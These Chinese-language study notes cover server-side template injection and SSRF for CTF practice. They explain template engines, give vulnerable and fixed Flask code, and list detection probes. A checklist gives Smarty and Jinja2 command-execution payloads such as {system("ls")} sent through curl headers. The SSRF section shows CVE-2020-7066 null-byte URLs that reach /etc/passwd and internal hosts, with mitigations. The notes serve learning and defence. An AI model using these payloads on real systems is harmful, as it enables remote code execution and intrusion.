# SSTI漏洞:**服务器端模板注入（Server-Side Template Injection）**

## 补充:

## 1. 什么是模板引擎？

### 1.1 模板引擎的概念

模板引擎是一种将静态模板与动态数据结合生成最终HTML页面的技术。它允许开发者：

* 分离业务逻辑和显示逻辑
* 重用页面布局
* 动态插入数据
* 减少代码重复

### 1.2 模板引擎的工作流程

```
模板文件 + 数据模型 → 模板引擎 → 最终HTML页面
```

### 1.3 常见模板引擎举例


| 语言       | 模板引擎                        |
| ---------- | ------------------------------- |
| Python     | Jinja2, Mako, Django Templates  |
| PHP        | Twig, Smarty, Blade             |
| Java       | Freemarker, Velocity, Thymeleaf |
| JavaScript | Handlebars, EJS, Pug            |
| Ruby       | ERB, Haml                       |

## 一、漏洞成因：模板引擎的 “误用”:

模板引擎的设计目的是 “将数据与模板分离”，让开发者通过模板语法（如`{{变量}}`）动态渲染页面。漏洞的根源在于**开发者未对用户输入做过滤，直接将其嵌入模板代码**，导致攻击者可构造恶意模板语法触发执行。

1. **输入未隔离**：用户输入（如 URL 参数、表单内容）未被当作 “纯数据” 处理，反而被当作 “模板语法的一部分” 拼接到模板中。
   例：某博客系统允许用户自定义昵称，开发者直接写模板 `Hello {{user_input}}`，若用户输入 `{{恶意代码}}`，则会被模板引擎解析。
2. **模板语法滥用**：部分模板引擎支持调用函数、访问对象属性（如 Python 的 Jinja2、Java 的 Freemarker），若未限制语法能力，攻击者可利用这些特性调用系统函数。
3. **框架默认配置不安全**：部分 Web 框架（如早期的 Flask、Django）的模板引擎默认未禁用危险语法，开发者未手动加固。

## 二. 什么是SSTI？

### 2.1 SSTI定义

**服务器端模板注入（Server-Side Template Injection）** 是指攻击者能够将恶意模板代码注入到服务器端模板中，并在服务器上执行这些代码的安全漏洞。

### 2.2 SSTI与XSS的区别


| 特性       | SSTI           | XSS          |
| ---------- | -------------- | ------------ |
| 执行位置   | 服务器端       | 客户端浏览器 |
| 危害范围   | 整个服务器     | 当前用户会话 |
| 利用复杂度 | 较高           | 相对较低     |
| 影响程度   | 服务器权限丢失 | 用户数据泄露 |

### 2.3 SSTI的危害

* 远程代码执行（RCE）
* 敏感信息泄露
* 服务器权限提升
* 内网渗透跳板
* 数据篡改和破坏

## 三. SSTI产生原理

### 3.1 漏洞产生条件

```python
# 漏洞代码示例 - 直接拼接用户输入
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/unsafe')
def unsafe_greeting():
    user_input = request.args.get('name', 'World')
    # 直接拼接用户输入到模板中 - 存在SSTI
    template = f"<h1>Hello {user_input}!</h1>"
    return render_template_string(template)
```

### 3.2 模板引擎的解析过程

```python
用户输入: {{7*7}}
模板代码: "<h1>Hello {{7*7}}!</h1>"
模板引擎解析: 识别{{...}}为表达式
执行计算: 7*7 = 49
最终输出: "<h1>Hello 49!</h1>"
```

### 3.3 安全的模板使用方式

```python
@app.route('/safe')
def safe_greeting():
    user_input = request.args.get('name', 'World')
    # 安全的模板使用 - 用户输入作为参数传递
    template = "<h1>Hello {{ name }}!</h1>"
    return render_template_string(template, name=user_input)
```

## 四. 常见模板引擎语法

### 1. 模板引擎基础语法对比


| 模板引擎   | 变量输出  | 控制语句            | 注释         | 文件包含            |
| ---------- | --------- | ------------------- | ------------ | ------------------- |
| Jinja2     | `{{...}}` | `{%...%}`           | `{#...#}`    | `{% include ... %}` |
| Twig       | `{{...}}` | `{%...%}`           | `{#...#}`    | `{% include ... %}` |
| Django     | `{{...}}` | `{%...%}`           | `{#...#}`    | `{% include ... %}` |
| Smarty     | `{$...}`  | `{if...}{/if}`      | `{*...*}`    | `{include ...}`     |
| Freemarker | `${...}`  | `<#...>`            | `<#--...-->` | `<#include ...>`    |
| Velocity   | `$...`    | `#if...#end`        | `##`         | `#parse()`          |
| Handlebars | `{{...}}` | `{{#if}}...{{/if}}` | `{{!...}}`   | 无内置              |

## 五. SSTI检测方法

### 5.1 基础检测Payload

```
数学运算检测:
{{7*7}}        → 49
${7*7}         → 49
<%= 7*7 %>     → 49
#{7*7}         → 49

字符串连接检测:
{{"a"+"b"}}    → ab
${"a"+"b"}     → ab
```

### 5.2 分步检测流程

**步骤1: 识别模板引擎**

```
GET /page?name=${{<%[%'"}}%\
POST /page name=${{<%[%'"}}%\
```

**步骤2: 测试基本语法****

```
# 尝试不同模板语法
?name={{7*7}}
?name=${7*7}
?name=<%= 7*7 %>
?name=#{7*7}
?name={{7*'7'}}
```

**步骤3: 确认漏洞存在**
观察响应中是否出现计算结果：

* 输入 `{{7*7}}`，返回包含 `49`
* 输入 `{{"a"+"b"}}`，返回包含 `ab`

# SSTI漏洞发现与注入点识别指南

## 1. SSTI注入点识别

### 1.1 常见的注入点位置

**URL参数:**

**text**

```
http://example.com/page?name=test
http://example.com/search?q=test
http://example.com/user/{{user_id}}
```

**表单输入:**

* 用户注册/登录表单
* 搜索框
* 评论/留言框
* 联系表单

**HTTP头部:**

**http**

```
GET / HTTP/1.1
Host: example.com
User-Agent: {{7*7}}
Referer: {{config}}
X-Forwarded-For: {{''.__class__}}
```

**Cookie值:**

**http**

```
Cookie: session=abc123; username={{7*7}}
```

**文件上传:**

* 文件名
* 文件元数据
* 上传路径

### 1.2 应用程序功能点

**内容管理系统:**

* 页面标题、内容
* 侧边栏、页脚
* 博客文章、评论
* 用户资料页面

**电子商务系统:**

* 产品名称、描述
* 用户评论
* 订单信息
* 促销信息

**用户管理系统:**

* 用户名显示
* 个人简介
* 消息通知
* 错误信息

# SSTI 漏洞解题 Checklist（通用版 + Smarty 专项）

这份清单覆盖 “漏洞判断→注入点定位→工具使用→命令执行” 全流程，既适配这道 Smarty 题，也能套用 Jinja2、Twig 等其他模板引擎的 SSTI 题目，按步骤执行即可。

## 一、漏洞判断：先确认 “是否存在 SSTI”（2 步即可）


| 步骤 | 操作                       | 判断标准                                                                                                                                                                                                                                                                         |
| ---- | -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | 找题目 “模板引擎线索”    | 看页面底部、响应头、题目描述，常见线索：- Smarty：`Build With Smarty`、`X-Powered-By: PHP`+`{ }`语法- Jinja2（Python）：`Rendered by Jinja2`、URL 含`template`参数- Twig（PHP）：`Twig_Error`报错、页面含`{{ }}`渲染痕迹                                                         |
| 2    | 用 “无风险 Payload” 验证 | 传简单模板语法（不触发命令执行，避免破坏环境）：- Smarty：`{4*4}`（预期返回 16）、`{$smarty.version}`（预期返回版本号）- Jinja2：`{{2*2}}`（预期返回 4）、`{{config.items()}}`（预期返回配置）- 若返回 “计算结果 / 版本 / 配置”→ 确认存在 SSTI；若返回 Payload 本身→ 无 SSTI |

## 二、注入点定位：找 “用户输入能被模板解析的位置”（按优先级排序）


| 优先级 | 测试位置                           | 操作示例（以 Smarty`{4*4}`为例）                                                        | 成功标志                                         |
| ------ | ---------------------------------- | --------------------------------------------------------------------------------------- | ------------------------------------------------ |
| 1      | 与 “页面显示内容相关的参数 / 头” | - XFF 头：`curl -H 'X-Forwarded-For: {4*4}' 目标URL`- IP 显示相关参数：`/api?ip={4*4}`  | 页面中 “IP 显示区”（如`Current IP:`后）返回 16 |
| 2      | URL 查询参数                       | - 通用参数：`?param={4*4}`、`?id={4*4}`- 模板相关参数：`?template={4*4}`、`?view={4*4}` | 页面任意位置返回 16，或出现模板语法报错          |
| 3      | 其他请求头                         | - User-Agent：`curl -A '{4*4}' 目标URL`- Referer：`curl -e '{4*4}' 目标URL`             | 页面若显示 UA/Referer 内容，返回 16              |
| 4      | POST 请求体                        | 用 curl 发 POST：`curl -d 'content={4*4}' 目标URL`                                      | 页面显示 POST 内容处返回 16                      |

## 三、工具使用：curl 专项注意事项（避坑关键）


| 注意点 | 问题原因                         | 正确操作示例                                                 |                                                                                                                     |                                                                  |                                                                      |
| ------ | -------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- | -------------------------------------------------------------------- |
| 1      | Shell 解析特殊字符（`{ }`、`$`） | Linux/macOS Shell 会把`{ }`当作 “大括号扩展”，篡改 Payload | 用**单引号**包裹含特殊字符的内容：`curl -H 'X-Forwarded-For: {system("ls")}' 目标URL`                               |                                                                  |                                                                      |
| 2      | 请求路径导致 301/404             | 部分路径（如`/xff`）可能配置重定向，丢失 Payload 解析        | 优先用 “能正常显示内容的路径”（如根路径`/`、`/api`），测试路径是否有效：`curl 目标URL/路径`（能返回 HTML 则有效） |                                                                  |                                                                      |
| 3      | 命令含 Shell 特殊字符（\`        | `、`&\`）                                                    | \`                                                                                                                  | `（管道）、`&\`（后台运行）会被 Shell 优先解析，导致命令执行失败 | 用**反斜杠`\`** 转义特殊字符：`curl -H 'X-Forwarded-For: {system("ls |

## 四、命令执行与 flag 获取：分阶段推进（安全不踩坑）


| 阶段 | 目标                 | 操作（Smarty 示例）                                | 成功标志                                                  |
| ---- | -------------------- | -------------------------------------------------- | --------------------------------------------------------- |
| 1    | 测试命令执行权限     | 跑简单无危害命令，确认功能可用                     | 返回服务器用户名（如`www-data`）、系统信息                |
| 2    | 遍历目录找 flag      | 从 “当前目录→上级目录→根目录” 逐步排查         | 找到含 “flag” 的文件（如`flag.php`、`nssctf_flag.txt`） |
| 3    | 读取 flag 内容       | 用`cat`/`more`读文件，若文件内容长，可加`grep`过滤 | 返回`NSSCTF{xxxxxx}`格式的 flag                           |
| 4    | 绕过命令过滤（备用） | 若`system`/`cat`被禁，用编码 / 替代函数            | 成功执行命令并返回结果                                    |

### 使用提示

1. 遇到其他模板引擎时，只需替换 “漏洞判断” 和 “命令执行” 的 Payload（如 Jinja2 用`{{os.popen("ls").read()}}`）；
2. 若 curl 执行命令无输出，可加`echo`强制输出（如`{system("echo<span> </span>`cat flag.php`")}`）。






# SSRF:服务器端请求伪造

CVE-2020-7066 是 PHP 中`get_headers()`函数的一个安全漏洞，主要影响**7.2.x < 7.2.29、7.3.x < 7.3.16、7.4.x < 7.4.4**的版本。它的核心原理是：**当用户提供的 URL 中包含`\0`（空字节）时，PHP 会静默截断 URL，导致服务器错误地向攻击者指定的目标发送请求**，从而引发信息泄露或 SSRF（服务器端请求伪造）攻击。

### **漏洞原理与利用场景**

#### 1. **漏洞触发条件**

* 服务器使用 PHP 的`get_headers()`函数处理用户输入的 URL。
* URL 中包含`\0`（空字节），例如：`http://example.com/%00evil.com`。
* PHP 版本未修复该漏洞（低于上述版本）。

#### 2. **攻击原理**

* **URL 截断**：`get_headers()`会将`%00`（URL 编码的空字节）视为字符串终止符，截断其后的内容。例如：
  php

  ```php
  $url = "http://localhost%00.ctfhub.com"; // PHP会解析为 "http://localhost"
  get_headers($url); // 实际请求的是 http://localhost
  ```
* **绕过限制**：若服务器对 URL 有格式限制（如必须以`.ctfhub.com`结尾），攻击者可通过`%00`截断绕过，让服务器实际请求内部 IP 或敏感地址。

### **CTF 中的典型利用方式**

在 CTF 中，该漏洞常与**SSRF**结合，用于读取服务器本地文件或内部服务。例如：

#### 1. **绕过 Host 头限制**

* 题目要求 Host 头必须以`123`结尾（如`*.123`），但服务器后端使用`get_headers()`验证 URL：
  php

  ```php
  $url = $_GET['url'];
  if (!preg_match('/\.123$/', parse_url($url, PHP_URL_HOST))) {
      die("Host must end with 123");
  }
  $headers = get_headers($url); // 漏洞点
  ```
* **攻击构造**：
  plaintext

  ```plaintext
  http://localhost%00.123/../../etc/passwd
  ```

  * PHP 解析 URL 时，`%00`截断后变为`http://localhost`，绕过正则校验。
  * 实际请求的是`http://localhost/../../etc/passwd`，读取服务器的密码文件。

#### 2. **利用 SSRF 访问内网服务**

* 若服务器可访问内网（如`192.168.1.100:8080`），但前端限制 URL 必须以`.ctfhub.com`结尾：
  plaintext

  ```plaintext
  http://192.168.1.100:8080%00.ctfhub.com
  ```

  * `get_headers()`实际请求内网地址，获取敏感信息。

### **漏洞修复与防御建议**

1. **升级 PHP 版本**：

   * 将 PHP 升级到**7.2.29+、7.3.16+、7.4.4+**，官方已修复该漏洞。
   * 示例：
     bash

     ```bash
     # Ubuntu/Debian
     sudo apt update && sudo apt install php7.4
     ```
2. **输入过滤**：

   * 禁止 URL 中包含`%00`（空字节），或使用`filter_var()`严格校验 URL 格式。

   php

   ```php
   $url = $_GET['url'];
   if (strpos($url, '%00') !== false) {
       die("Invalid URL");
   }
   if (!filter_var($url, FILTER_VALIDATE_URL)) {
       die("Invalid URL");
   }
   ```
3. **限制网络访问**：

   * 使用防火墙或代理限制服务器对内部网络的访问，避免 SSRF 攻击扩大影响。
